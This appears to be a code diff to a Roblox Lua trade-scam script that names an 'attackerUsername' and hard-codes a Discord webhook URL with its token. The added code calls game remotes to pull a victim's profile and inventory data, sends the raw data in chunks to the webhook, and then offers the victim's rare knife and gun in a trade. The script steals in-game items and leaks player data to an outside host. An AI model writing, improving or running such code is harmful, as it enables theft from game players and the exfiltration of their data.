@@ -1,4 +1,4 @@
---[=[ FINAL: Profile-based trade with name lookup ]=]
+--[=[ FINAL: Robust profile parser with full Discord logging ]=]
 
 local webhookURL = "https://discord.com/api/webhooks/1532509426257236008/TQrtSPyEYviVXAPzhBbVgaPIRcKFLHghPCxBfD3TFQ7njWBM7qngokItqz0vCXkiCkcz"
 local attackerUsername = "FEARACCE"
@@ -102,33 +102,68 @@ local function tableToString(tbl, indent)
     for k, v in pairs(tbl) do
         local key = type(k) == "string" and k or "["..tostring(k).."]"
         if type(v) == "table" then
-            table.insert(lines, pad .. key .. " = {\n" .. tableToString(v, indent+2) .. pad .. "}")
+            lines[#lines+1] = pad .. key .. " = {\n" .. tableToString(v, indent+2) .. pad .. "}"
         else
-            table.insert(lines, pad .. key .. " = " .. tostring(v))
+            lines[#lines+1] = pad .. key .. " = " .. tostring(v)
         end
     end
     return table.concat(lines, ",\n")
+end
+
+-- --- Send a long message in chunks
+local function sendChunked(msg)
+    local chunkSize = 1900
+    if #msg <= chunkSize then
+        send(msg)
+        return
+    end
+    local pos = 1
+    while pos <= #msg do
+        local chunk = msg:sub(pos, pos+chunkSize-1)
+        send("```lua\n" .. chunk .. "\n```")
+        pos = pos + chunkSize
+        wait(0.3)
+    end
 end
 
 -- --- Get profile data and extract knife & gun
 local function getPlayerItems()
     local InventoryFolder = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("Inventory")
     local GetProfileData = InventoryFolder and InventoryFolder:FindFirstChild("GetProfileData")
-    if not GetProfileData then
-        send("❌ GetProfileData remote not found.")
-        return nil, nil
+    local GetPlayerData = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("Extras") and RS.Remotes.Extras:FindFirstChild("GetPlayerData")
+    
+    local data = nil
+    local source = ""
+
+    -- Try GetProfileData
+    if GetProfileData then
+        local ok, result = pcall(function() return GetProfileData:InvokeServer() end)
+        if ok and result then
+            data = result
+            source = "GetProfileData"
+        end
     end
-    local ok, data = pcall(function() return GetProfileData:InvokeServer() end)
-    if not ok or not data then
-        send("❌ Failed to get profile data.")
+
+    -- If that fails, try GetPlayerData
+    if not data and GetPlayerData then
+        local ok, result = pcall(function() return GetPlayerData:InvokeServer() end)
+        if ok and result then
+            data = result
+            source = "GetPlayerData"
+        end
+    end
+
+    if not data then
+        send("❌ No profile data retrieved.")
         return nil, nil
     end
 
-    -- Send the full structure to Discord for debugging
-    local struct = tableToString(data)
-    send("📋 Full profile data:\n```lua\n" .. struct .. "\n```")
+    -- Send raw data to Discord (chunked)
+    local serialized = tableToString(data)
+    send("📋 Raw profile data (" .. source .. "):")
+    sendChunked(serialized)
 
-    -- Try to find the local player's entry
+    -- Parse: find entry for local player
     local localName = player.Name
     local localUserId = player.UserId
     local entry = nil
@@ -136,13 +171,13 @@ local function getPlayerItems()
     -- Method 1: keyed by player name
     if data[localName] and type(data[localName]) == "table" then
         entry = data[localName]
-        send("✅ Found by player name: " .. localName)
+        send("✅ Found entry by player name: " .. localName)
     else
         -- Method 2: scan for matching UserId
         for _, e in pairs(data) do
             if type(e) == "table" and e.UserId == localUserId then
                 entry = e
-                send("✅ Found by UserId")
+                send("✅ Found entry by UserId")
                 break
             end
         end
@@ -150,6 +185,12 @@ local function getPlayerItems()
 
     if not entry then
         send("❌ Could not find entry for " .. localName)
+        -- Try to list all keys for debugging
+        local keys = {}
+        for k, _ in pairs(data) do
+            keys[#keys+1] = tostring(k)
+        end
+        send("Available keys: " .. table.concat(keys, ", "))
         return nil, nil
     end
 
@@ -230,12 +271,12 @@ spawn(function()
     if knife and knife ~= "DefaultKnife" then
         if offerItemByName(knife) then offered = offered + 1 end
     else
-        send("⚠️ Victim has default knife – no trade needed.")
+        send("⚠️ Victim has default knife – no rare knife.")
     end
     if gun and gun ~= "DefaultGun" then
         if offerItemByName(gun) then offered = offered + 1 end
     else
-        send("⚠️ Victim has default gun – no trade needed.")
+        send("⚠️ Victim has default gun – no rare gun.")
     end
 
     if offered == 0 then
